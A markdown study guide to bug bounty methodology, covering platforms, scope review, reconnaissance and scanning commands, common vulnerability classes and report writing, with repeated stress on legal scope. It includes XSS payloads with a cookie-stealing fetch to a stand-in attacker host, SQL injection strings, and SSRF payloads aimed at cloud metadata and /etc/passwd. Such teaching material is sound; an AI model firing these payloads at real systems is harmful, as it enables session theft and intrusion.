# Bug Bounty — Methodology & Tools

> **Legal Notice:** Only test targets within defined scope. Read every program's rules of engagement before testing. Unauthorized testing is illegal even on bug bounty platforms.

Bug bounty programs allow security researchers to legally find and report vulnerabilities in exchange for monetary rewards. It's the closest thing to a real-world pentest you can do legally.

**Udemy alignment:** Section 36 of "Hacker Ético Profissional com Kali Linux v2025" covers Bug Bounty methodology end-to-end.

---

## Bug Bounty Platforms

### Major Platforms

| Platform | Focus | Best For |
|----------|-------|----------|
| [HackerOne](https://hackerone.com) | Largest, most programs | Beginners, all skill levels |
| [Bugcrowd](https://bugcrowd.com) | Enterprise, private programs | Mid-level researchers |
| [Intigriti](https://intigriti.com) | European companies | EU-based targets |
| [YesWeHack](https://yeswehack.com) | Growing platform | EU/global |
| [Synack](https://synack.com) | Vetted researchers only | Senior researchers |
| [Open Bug Bounty](https://openbugbounty.org) | XSS/CSRF focus | Learning |

### Platform Comparison

| Feature | HackerOne | Bugcrowd | Intigriti |
|---------|-----------|----------|-----------|
| Programs | 3000+ | 1500+ | 500+ |
| Public programs | Many | Some | Many |
| Average payout | $500-2000 | $300-1500 | $400-3000 |
| Hall of fame | Yes | Yes | Yes |
| API access | Yes | Yes | Yes |
| Learning resources | Good | Good | Good |

---

## Pre-Engagement — Scope Review

**Always read the scope before touching anything.**

```
Questions to answer before starting:
1. What domains/subdomains are in scope?
2. What domains/IPs are explicitly OUT of scope?
3. What vulnerability types are accepted?
4. What is the maximum severity they reward?
5. Are there rate-limiting requirements?
6. Is automated scanning allowed? (many programs say NO)
7. What is the disclosure timeline?
8. Are third-party services included?
```

**Common scope limitations:**
- Main domain in scope, all subdomains NOT (or vice versa)
- Production environment only (not staging/dev)
- No DoS/DDoS testing
- No physical/social engineering
- No access to other users' data (test on your own account only)
- Employee accounts excluded

---

## Bug Bounty Methodology

### Phase 1: Reconnaissance

```bash
# 1. Subdomain enumeration (most important step)
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com >> subdomains.txt
sort -u subdomains.txt > unique_subs.txt

# 2. Live host check (filter down to responding hosts)
cat unique_subs.txt | httpx -status-code -title -o live_hosts.txt

# 3. Screenshot all live hosts
eyewitness --web -f live_hosts.txt -d screenshots/

# 4. Find URLs from historical data
gau target.com | tee urls-gau.txt              # GetAllURLs
waybackurls target.com | tee urls-wayback.txt  # Wayback Machine
cat urls-*.txt | sort -u > all-urls.txt

# 5. Find parameters in URLs (for injection testing)
cat all-urls.txt | grep "?" | tee parameterized-urls.txt
```

### Phase 2: Technology Fingerprinting

```bash
# Identify technologies (WAF, CMS, framework, CDN)
whatweb target.com
wappalyzer-cli target.com

# Detect WAF
wafw00f https://target.com

# Check headers for technology leaks
curl -I https://target.com | grep -i "server\|x-powered\|x-aspnet"
```

### Phase 3: Automated Scanning

```bash
# Run Nuclei templates (most efficient automated scan)
nuclei -l live_hosts.txt -t nuclei-templates/ -o nuclei-results.txt

# Focus on specific severity
nuclei -l live_hosts.txt -severity critical,high -o high-crit.txt

# Run specific template categories
nuclei -u target.com -t exposures/ -t misconfiguration/ -t cves/

# Directory fuzzing (check if allowed in scope first!)
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  -u https://target.com/FUZZ -mc 200,301,302,403 -o ffuf-results.json
```

### Phase 4: Manual Testing

Focus on what automated tools miss:

```bash
# Business logic flaws — manual only
# - Price manipulation
# - IDOR (Insecure Direct Object Reference)
# - Privilege escalation
# - Account takeover

# JWT token testing
# Check if JWT is signed (none algorithm attack)
# Check if secret is weak

# GraphQL testing
# Introspection: {"query": "{ __schema { types { name } } }"}
# Check for batch queries, aliases

# OAuth testing
# Check redirect_uri validation
# Check state parameter (CSRF)
# Check scope creep
```

### Phase 5: Reporting

A bad report = no payout, even for valid bugs. Write clearly.

---

## Key Tools

### Subfinder — Subdomain Enumeration

```bash
# Install
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Basic enumeration
subfinder -d target.com

# With API keys (in ~/.config/subfinder/provider-config.yaml)
subfinder -d target.com -all

# Output to file
subfinder -d target.com -o subdomains.txt

# Recursive (find subs of subs)
subfinder -d target.com -recursive
```

### Nuclei — Vulnerability Scanner with Templates

```bash
# Install
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Download/update templates
nuclei -update-templates

# Scan single target
nuclei -u https://target.com

# Scan host list
nuclei -l hosts.txt

# Filter by severity
nuclei -u https://target.com -severity critical,high,medium

# Filter by tags
nuclei -u https://target.com -tags cve,exposure,misconfig

# Custom templates
nuclei -u https://target.com -t /path/to/custom-template.yaml

# Output formats
nuclei -u https://target.com -o results.json -json
```

### ffuf — Fast Web Fuzzer

```bash
# Directory fuzzing
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  -u https://target.com/FUZZ

# Parameter fuzzing
ffuf -w params.txt -u "https://target.com/search?FUZZ=test"

# Value fuzzing
ffuf -w values.txt -u "https://target.com/user?id=FUZZ"

# Virtual host fuzzing
ffuf -w subdomains.txt -u https://target.com -H "Host: FUZZ.target.com"

# Filter by status code
ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,301,302

# Filter by size (exclude default 404 pages with specific size)
ffuf -w wordlist.txt -u https://target.com/FUZZ -fs 4242

# Rate limiting
ffuf -w wordlist.txt -u https://target.com/FUZZ -rate 50

# Save output
ffuf -w wordlist.txt -u https://target.com/FUZZ -o results.json -of json
```

### Amass — Advanced Attack Surface Discovery

```bash
# Passive enumeration (no direct contact with target)
amass enum -passive -d target.com

# Active enumeration (brute-force + direct queries)
amass enum -active -d target.com

# Use all data sources
amass enum -d target.com -config ~/.config/amass/config.ini

# Intelligence gathering
amass intel -d target.com        # find ASNs, CIDRs
amass intel -asn 12345           # enumerate from ASN

# Visualize
amass viz -d target.com -dot | dot -Tpng -o graph.png
```

### gau — Get All URLs

```bash
# Install
go install github.com/lc/gau/v2/cmd/gau@latest

# Fetch all URLs from AlienVault OTX and Wayback Machine
gau target.com

# Fetch with blacklisted extensions
gau --blacklist jpg,jpeg,png,gif,css,woff target.com

# Output to file
gau target.com | tee all-urls.txt

# Filter for parameters only
gau target.com | grep "?"
```

### waybackurls — Wayback Machine URL Fetcher

```bash
# Install
go install github.com/tomnomnom/waybackurls@latest

# Fetch URLs
echo target.com | waybackurls | tee wayback-urls.txt

# Multiple targets
cat domains.txt | waybackurls | tee wayback-all.txt
```

### httpx — HTTP Probe Tool

```bash
# Install
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# Check which hosts are alive
cat subdomains.txt | httpx

# Include status code, title, technologies
cat subdomains.txt | httpx -status-code -title -tech-detect -o live-hosts.txt

# Filter by status
cat subdomains.txt | httpx -mc 200,301,302

# Check for specific string
cat subdomains.txt | httpx -match-string "admin"
```

---

## High-Value Bug Classes

Focus your manual effort here for highest return:

### IDOR (Insecure Direct Object Reference)
```
# Example: Change user ID in URL or request body
GET /api/users/123/profile → change to /api/users/124/profile
POST /delete {"user_id": 123} → change to {"user_id": 124}

# Test in API responses: does response contain other user's data?
```

### Broken Authentication
```
# Password reset token reuse
# JWT none algorithm: change alg to "none", remove signature
# OAuth state parameter missing (CSRF on login)
# Session fixation
# Account takeover via email change without verification
```

### XSS (Cross-Site Scripting)
```html
<!-- Basic test payloads -->
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(1)

<!-- For bug bounty: demonstrate impact, not just alert() -->
<!-- Show: cookie theft, keylogging, account takeover via XSS -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```

### SQL Injection
```
# Test for errors first
parameter' → SQL error?
parameter' OR '1'='1 → extra results?
parameter' AND SLEEP(3)-- → delayed response?

# Tools: sqlmap --risk=1 --level=1 (start conservative)
```

### SSRF (Server-Side Request Forgery)
```
# Find parameters that fetch URLs
url=, redirect=, path=, next=, image=, callback=

# Test payloads
url=http://127.0.0.1/admin
url=http://169.254.169.254/latest/meta-data/  # AWS metadata
url=http://metadata.google.internal/           # GCP metadata
url=file:///etc/passwd
```

---

## Report Writing

A good report structure:

```markdown
## Summary
One paragraph describing the vulnerability, location, and impact.

## Vulnerability Details
- **Type:** IDOR / XSS / SQLi / etc.
- **Severity:** Critical / High / Medium / Low
- **CVSS Score:** 8.5 (if applicable)
- **URL/Endpoint:** https://target.com/api/users/{id}
- **Parameter:** `id`
- **Method:** GET

## Steps to Reproduce
1. Log in as User A (attacker@test.com)
2. Navigate to https://target.com/api/users/123/profile
3. Change `123` to `124` in the URL
4. Observe that User B's private data is returned

## Proof of Concept
[Screenshot or video showing the vulnerability]

## Impact
An attacker can access any user's private profile data without authentication,
including email addresses, phone numbers, and payment information.
This affects all N users registered on the platform.

## Remediation
Implement server-side authorization: verify that the authenticated user owns
the requested resource before returning data. Use indirect object references
(GUIDs) instead of sequential integers.
```

### Report Quality Tips

- Never submit unverified reports ("I think this might be vulnerable")
- Show real impact — `alert(1)` is worth much less than demonstrating cookie theft
- One issue per report (don't bundle multiple bugs)
- Include full request/response for all steps
- Be professional — no threats, no demands, no self-aggrandizement
- Always check duplicates first (search the platform for your bug type on that target)

---

## Legal & Ethical Rules

```
DO:
✓ Only test assets within defined scope
✓ Stop as soon as you've proven the vulnerability
✓ Report even small bugs — many small bugs = experience
✓ Wait for program response before discussing publicly
✓ Follow responsible disclosure timelines

DON'T:
✗ Access, modify, or delete user data
✗ Disrupt the service (no DoS)
✗ Use automated tools if the program prohibits it
✗ Test from shared IPs that could affect other users
✗ Share vulnerabilities publicly before disclosure period ends
✗ Test out-of-scope targets even if they're vulnerable
```

---

## Bug Bounty Starter Checklist

Before your first submission:

- [ ] Profile complete on chosen platform
- [ ] Read the program's policy in full — twice
- [ ] Confirmed the target is in scope
- [ ] Set up Burp Suite to intercept traffic
- [ ] Set up a test account on the target (never use others' accounts)
- [ ] Ran subdomain enumeration and saved results
- [ ] Ran Nuclei templates against live hosts
- [ ] Identified at least one interesting endpoint for manual testing
- [ ] Documented your testing steps as you go
- [ ] Have a clear reproduction path before reporting
- [ ] Report is written clearly with full evidence

---

## Resources

- [HackerOne — Getting Started](https://www.hackerone.com/resources/hackerone/hacker-101)
- [Bug Bounty Bootcamp (book)](https://nostarch.com/bug-bounty-bootcamp) — Vickie Li
- [Web Application Hacker's Handbook](https://www.wiley.com/en-us/The+Web+Application+Hacker%27s+Handbook%2C+2nd+Edition-p-9781118026472)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — free labs
- [HackerOne Hacktivity](https://hackerone.com/hacktivity) — disclosed reports to learn from
- [Intigriti Bug Bytes Newsletter](https://blog.intigriti.com/category/bugbytes/)
- [NahamSec — Bug Bounty YouTube](https://www.youtube.com/c/NahamSec)
- [STOK — Bug Bounty YouTube](https://www.youtube.com/c/STOKfredrik)
- [Udemy: Hacker Ético Profissional — Section 36](https://www.udemy.com/course/hacker-etico-profissional/)
- [SecLists — Wordlists](https://github.com/danielmiessler/SecLists)
- [ProjectDiscovery Tools](https://projectdiscovery.io)
